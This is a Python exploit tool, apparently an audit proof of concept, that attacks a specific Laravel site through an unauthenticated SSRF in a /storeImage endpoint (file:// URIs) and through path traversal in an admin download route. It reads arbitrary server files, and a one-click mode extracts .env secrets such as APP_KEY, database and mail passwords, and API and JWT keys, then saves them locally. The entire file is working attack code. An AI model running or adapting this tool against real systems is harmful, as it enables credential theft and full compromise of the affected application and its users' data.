import sys
import os
import requests

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

# ── banner ────────────────────────────────────────────────────────────────────

def _build_banner():
    title_lines_raw = [
        " ____  ____  ____  _____ _____ _____ _____ _  _ ",
        "/ ___|/ ___||  _ \\|  ___| ____|_   _/ ____| || |",
        "\\___ \\\\___ \\| |_) | |_  |  _|   | || |    | __ |",
        " ___) |___) |  _ <|  _| | |___  | || |____| || |",
        "|____/|____/|_| \\_\\_|   |_____| |_| \\_____|_||_|",
    ]
    title_lines = [f"{MAGENTA}{l}{RESET}" for l in title_lines_raw]

    art = [
        f"  {DIM}file:///c:/laragon/{RESET}",
        f"  {DIM}  www/es_ldcu/{RESET}",
        f"  {RED}    .env{RESET}",
        f"  {DIM}      → public/{RESET}",
        f"  {GREEN}        /.env{RESET}",
    ]

    T = max(len(l) for l in title_lines_raw)
    top_pad    = [""] * 2
    bot_pad    = [""] * 2
    left_lines = top_pad + [f"{l}{' ' * (T - len(r))}" for l, r in zip(title_lines, title_lines_raw)] + bot_pad
    right_lines = [""] * 2 + art + [""] * 1

    out = ["\n"]
    for l, r in zip(left_lines, right_lines):
        out.append(f"  {l}   {r}")
    out.append(f"\n  {DIM}  SSRF + path traversal file reader  ·  SECURITY_AUDIT POC #3 / #5{RESET}\n")
    return "\n".join(out)

print(_build_banner())

# ── menu ──────────────────────────────────────────────────────────────────────

MODES = [
    (RED,     "Read .env via SSRF          (storeImage file:// — no auth)"),
    (RED,     "Read arbitrary file via SSRF (storeImage file:// — no auth)"),
    (YELLOW,  "Download file via path traversal (administrator/downloadfile)"),
    (CYAN,    "Quick .env steal — SSRF then fetch saved copy"),
]

def print_menu():
    print(f"\n  {DIM}┌{'─' * 60}┐{RESET}")
    for i, (color, desc) in enumerate(MODES, 1):
        pad = " " * (58 - len(desc))
        print(f"  {DIM}│{RESET}  {color}[{i}]{RESET} {desc}{pad}{DIM}│{RESET}")
    print(f"  {DIM}│{RESET}  {RED}[0]{RESET} Exit{' ' * 53}{DIM}│{RESET}")
    print(f"  {DIM}└{'─' * 60}┘{RESET}")

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    BASE_URL       = input(f"  {CYAN}[?]{RESET} Target URL                        : ").strip().rstrip("/")
    SESSION_COOKIE = input(f"  {CYAN}[?]{RESET} laravel_session [skip for unauth] : ").strip()
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

def _hdrs():
    h = {"X-Requested-With": "XMLHttpRequest"}
    if SESSION_COOKIE:
        h["Cookie"] = f"laravel_session={SESSION_COOKIE}"
    return h

def _get(path, params=None):
    try:
        r = requests.get(f"{BASE_URL}{path}", params=params, headers=_hdrs(), timeout=15)
        return r
    except Exception as e:
        print(f"  {RED}[!]{RESET} {e}")
        return None

def _ssrf_read(file_uri, tablename="onlinepayments"):
    """Trigger storeImage SSRF, then fetch the saved file from public/."""
    # The controller saves the file to public/{tablename}/{last_path_component}
    # For file:///c:/laragon/www/es_ldcu/.env the saved path depends on splitting by '/'
    # folderPath parts: ['file:', '', '', 'c:', 'laragon', 'www', 'es_ldcu', '.env']
    # saved to: public/onlinepayments/es_ldcu/.env (4th and 5th components)
    # Actually the controller uses: public/{tablename}/{folderPath[-2]}/{folderPath[-1]}
    print(f"\n  {DIM}[>]{RESET} GET /storeImage?imagepath={file_uri}")
    r = _get("/storeImage", params={"imagepath": file_uri, "tablename": tablename})
    if r is None: return None
    sc = GREEN if r.status_code < 400 else RED
    print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  {DIM}{r.text[:100]}{RESET}")

    # derive saved URL
    parts = [p for p in file_uri.replace("file:///","").split("/") if p]
    if len(parts) >= 2:
        saved_path = f"/{tablename}/{'/'.join(parts[-2:])}"
    elif len(parts) == 1:
        saved_path = f"/{tablename}/{parts[0]}"
    else:
        saved_path = None

    if saved_path:
        print(f"  {DIM}[>]{RESET} Fetching saved copy: {CYAN}{BASE_URL}{saved_path}{RESET}")
        r2 = requests.get(f"{BASE_URL}{saved_path}", timeout=10)
        return r2
    return None

# ── main loop ─────────────────────────────────────────────────────────────────

while True:
    print_menu()
    try:
        choice = input(
            f"  {DIM}┌─[{RESET}{MAGENTA}ssrfetch{RESET}{DIM}@{RESET}{YELLOW}lfi{RESET}{DIM}]─[~]{RESET}\n"
            f"  {DIM}└──╼{RESET} {GREEN}${RESET} "
        ).strip()
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[!]{RESET} Exiting.\n")
        sys.exit(0)

    if choice == "0":
        print(f"\n  {YELLOW}[!]{RESET} Exiting.\n")
        sys.exit(0)

    elif choice == "1":
        # Read .env via SSRF (auto-detects Windows path)
        try:
            env_path = input(
                f"  {CYAN}[?]{RESET} .env path [{DIM}file:///c:/laragon/www/es_ldcu/.env{RESET}]: "
            ).strip() or "file:///c:/laragon/www/es_ldcu/.env"
        except KeyboardInterrupt:
            continue
        r = _ssrf_read(env_path)
        if r is None:
            print(f"  {RED}[!]{RESET} Could not retrieve saved file.")
            continue
        sc = GREEN if r.status_code == 200 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  ({len(r.content)} bytes)")
        if r.status_code == 200:
            content = r.text
            print(f"\n  {GREEN}[+]{RESET} .env contents:\n")
            for line in content.splitlines()[:60]:
                key_color = YELLOW if "=" in line and not line.startswith("#") else DIM
                print(f"  {key_color}{line}{RESET}")
            out = "ssrf_env.txt"
            with open(out, "w") as f:
                f.write(content)
            print(f"\n  {GREEN}[✓]{RESET} Saved → {CYAN}{out}{RESET}")
        else:
            print(f"  {DIM}{r.text[:300]}{RESET}")

    elif choice == "2":
        # Arbitrary file via SSRF
        try:
            file_uri = input(f"  {CYAN}[?]{RESET} File URI (file:///path/to/file): ").strip()
            tablename = input(f"  {CYAN}[?]{RESET} Table name [onlinepayments]: ").strip() or "onlinepayments"
        except KeyboardInterrupt:
            continue
        r = _ssrf_read(file_uri, tablename)
        if r is None: continue
        sc = GREEN if r.status_code == 200 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  ({len(r.content)} bytes)")
        if r.status_code == 200:
            out = "ssrf_file.txt"
            with open(out, "wb") as f:
                f.write(r.content)
            print(f"  {GREEN}[✓]{RESET} Saved → {CYAN}{out}{RESET}")
            print(f"\n{DIM}{r.text[:600]}{RESET}")
        else:
            print(f"  {DIM}{r.text[:300]}{RESET}")

    elif choice == "3":
        # Path traversal download via administrator/downloadfile
        if not SESSION_COOKIE:
            print(f"\n  {YELLOW}[!]{RESET} This mode requires an authenticated session cookie.")
            continue
        try:
            filepath = input(
                f"  {CYAN}[?]{RESET} File path [{DIM}../.env{RESET}]: "
            ).strip() or "../.env"
            out_name  = input(f"  {CYAN}[?]{RESET} Save as [stolen_file]: ").strip() or "stolen_file"
        except KeyboardInterrupt:
            continue
        print(f"\n  {DIM}[>]{RESET} GET /administrator/downloadfile?filepath={filepath}")
        r = _get("/administrator/downloadfile", params={"filepath": filepath})
        if r is None: continue
        sc = GREEN if r.status_code == 200 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}  ({len(r.content)} bytes)")
        if r.status_code == 200 and r.content:
            with open(out_name, "wb") as f:
                f.write(r.content)
            print(f"  {GREEN}[✓]{RESET} Saved → {CYAN}{out_name}{RESET}")
            print(f"\n{DIM}{r.text[:600]}{RESET}")
        else:
            print(f"  {DIM}{r.text[:300]}{RESET}")

    elif choice == "4":
        # One-click .env steal: SSRF → fetch → print key env vars
        env_path = "file:///c:/laragon/www/es_ldcu/.env"
        print(f"\n  {DIM}[>]{RESET} Quick .env steal (Windows Laragon path)")
        r = _ssrf_read(env_path)
        if r is None or r.status_code != 200:
            # Try Linux path
            env_path = "file:///var/www/html/.env"
            print(f"  {DIM}[>]{RESET} Retrying Linux path ...")
            r = _ssrf_read(env_path)
        if r is None or r.status_code != 200:
            print(f"  {RED}[!]{RESET} Could not fetch .env — try modes 1 or 2 for custom path.")
            continue
        content = r.text
        print(f"\n  {GREEN}[+]{RESET} Key values extracted:\n")
        important = ["APP_KEY","APP_URL","DB_HOST","DB_DATABASE","DB_USERNAME","DB_PASSWORD","MAIL_PASSWORD","SMS_","JWT_","API_"]
        for line in content.splitlines():
            if any(line.startswith(k) for k in important):
                k,_,v = line.partition("=")
                print(f"  {YELLOW}{k}{RESET} = {GREEN}{v}{RESET}")
        out = "ssrf_env.txt"
        with open(out, "w") as f:
            f.write(content)
        print(f"\n  {GREEN}[✓]{RESET} Full .env saved → {CYAN}{out}{RESET}")

    else:
        print(f"\n  {RED}[!]{RESET} Invalid choice.\n")
